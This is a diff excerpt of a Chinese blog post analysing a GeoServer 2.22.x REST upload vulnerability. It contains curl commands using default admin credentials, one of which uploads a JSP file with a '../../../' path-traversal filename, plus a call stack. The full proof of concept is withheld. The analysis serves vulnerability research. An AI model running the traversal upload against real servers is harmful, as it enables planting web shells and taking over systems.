@@ -36,7 +36,7 @@ https://docs.geoserver.org/2.22.x/en/user/installation/docker.html
 直接拿来用
 
 ```
-docker pull docker.osgeo.org/geoserver:2.22.x
+docker pull docker.osgeo.org/geoserver:2.22.x
 docker run --mount type=bind,src=/MY/DATADIRECTORY,target=/opt/geoserver_data -it -p8080:8080 docker.osgeo.org/geoserver:2.22.x
 
 ```
@@ -64,7 +64,7 @@ docker run --mount type=bind,src=/MY/DATADIRECTORY,target=/opt/geoserver_data -i
 既然找到了接口函数，接下来直接构造一个请求即可了
 
 ```
-curl -v -H"Content-Type:" -u "admin:geoserver" --data-binary @1.zip "http://localhost:8080/geoserver/rest/workspaces/xxx/coveragestores/xtest/file.a?file
+curl -v -H"Content-Type:" -u "admin:geoserver" --data-binary @1.zip "http://localhost:8080/geoserver/rest/workspaces/xxx/coveragestores/xtest/file.a?file
 
 ```
 
@@ -80,12 +80,12 @@ curl -v -H"Content-Type:" -u "admin:geoserver" --data-binary @1.zip "http
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybGBcHriamXMqibDrMMXYMqqeic12fNfVdppPjmic2Ycylh45TPHyMZic3uS4iaeMFUedZCicaA5Kr7AF9DtA/640?wx_fmt=png&from=appmsg)
 
-也就是说，如果想 post 成功，所谓的 “coverage store is a structured ”，注意后面的 e.g 提到了一个类型 “mosaic”，不管他是什么找一个这个类型的提交试试。在翻了半天 Demo 后，终于找到一个符合要求的。接下来碰到第二个神坑。
+也就是说，如果想 post 成功，所谓的 “coverage store is a structured ”，注意后面的 e.g 提到了一个类型 “mosaic”，不管他是什么找一个这个类型的提交试试。在翻了半天 Demo 后，终于找到一个符合要求的。接下来碰到第二个神坑。
 
 用下面命令发送上传请求后  
 
 ```
-curl -v -XPOST -H "Content-type: multipart/form-data" -F "file=@2.jsp" -u "admin:geoserver" "http://localhost:8080/geoserver/rest/workspaces/xxx/coveragestores/xtest/file.a?filename=../../../2.jsp
+curl -v -XPOST -H "Content-type: multipart/form-data" -F "file=@2.jsp" -u "admin:geoserver" "http://localhost:8080/geoserver/rest/workspaces/xxx/coveragestores/xtest/file.a?filename=../../../2.jsp
 
 ```
 
@@ -131,11 +131,11 @@ curl -v -XPOST -H "Content-type: multipart/form-data" -F "file=@2.jsp" -
 handleBinUpload:131, RESTUtils (org.geoserver.rest.util)
 handleFileUpload:70, AbstractStoreUploadController (org.geoserver.rest.catalog)
 doFileUpload:457, CoverageStoreFileController (org.geoserver.rest.catalog)
-coverageStorePost:120, CoverageStoreFileController (org.geoserver.rest.catalog)
+coverageStorePost:120, CoverageStoreFileController (org.geoserver.rest.catalog)
 
 ```
 
-**0x04 复现**
+**0x04 复现**
 
 我知道有些伸手党肯定直接滑到这里了，介于该 poc 还没完全公开，我也不直接发 poc，有兴趣的同学看了上面的分析肯定能复现出来的。更详细的过程和 poc 发在小密圈，小白和伸手党进圈查看吧。
 
